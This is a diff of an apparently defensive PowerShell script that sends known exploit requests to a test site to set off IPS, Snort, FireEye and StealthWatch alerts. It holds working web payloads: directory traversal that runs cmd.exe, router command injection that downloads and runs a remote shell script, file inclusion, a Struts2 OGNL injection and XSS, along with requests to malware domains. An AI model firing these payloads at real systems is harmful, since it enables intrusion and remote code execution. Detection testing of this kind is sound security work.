@@ -2,7 +2,7 @@ $browser = New-Object System.Net.WebClient
 $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
 
 
-For ($i=0; $i -le 10; $i++) {
+#For ($i=0; $i -le 10; $i++) {
 
 #0234: HTTP: Nimda / Code Red / Code Blue Attack
 wget "http://lorenanorton.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
@@ -205,7 +205,7 @@ wget "http://lorenanorton.com/GponForm/diag_Form?images/" -TimeoutSec 5 -UserAge
 wget "http://lorenanorton.com/login.cgi?cli=aa%20aa%27;wget%20http://80.211.106.251/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 
 #31942: HTTP: D-Link DSL-2750B Command Injection Vulnerability
-wget http://112.197.217.177/login.cgi?cli=aa%20aa%27;wget%20http://159.89wget .204.166/d%20-O%20-%3E%20/tmp/ds;sh%20/tmp/ds%27$ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
+wget http://lorenanorton.com/login.cgi?cli=aa%20aa%27;wget%20http://159.89wget .204.166/d%20-O%20-%3E%20/tmp/ds;sh%20/tmp/ds%27$ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 
 #32705: HTTP: phpMyAdmin Local File Inclusion Vulnerability
 wget http://lorenanorton.com/index.php?target=db_sql.php%253f/../../../../../../windows/win.ini -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
@@ -213,7 +213,7 @@ wget http://lorenanorton.com/index.php?target=db_sql.php%253f/../../../../../../
 #32892: HTTP: OGNL Entity Usage in an HTTP URI
 wget "www.lorenanorton.com/%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27eresult%27%2c%27struts2_security_check%27))%7d/" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 
-}
+#}
 
 #Doesnt trigger anything
 wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?page=/var/www/fileincl../../../../../../../test_include.txt%00%00%00%00%00%00%00%00%00%00%00" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
@@ -224,8 +224,23 @@ wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?name=ha<script>eval(Stri
 
 
 
+###Snort & Converted Snort Rules for Tipping Point IPS###
+#User-Agent Anomolous Non-Business Traffic
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Baidu Test"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "WPScan"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Synapse"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "sqlmap"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Python"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "PycURL"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Paros"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "OpenVAS"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Nmap"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Nikto"
+wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Kazehakase"
 
 
+
+###FireEye###
 #FireEye (Alert): Ransomware
 wget "https://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" -TimeoutSec 5 -UserAgent "Ransomware (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 
@@ -302,7 +317,9 @@ wget http://robwassotdint.ru -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9
 wget http://95.110.193.132/ser0410.bin -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 
 
+###StealthWatch###
 #StealthWatch Sites to trip cognitive threat analytics
+
 wget http://www.examplemalwaredomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 wget http://www.internetbadguys.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 wget http://www.examplebotnetdomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
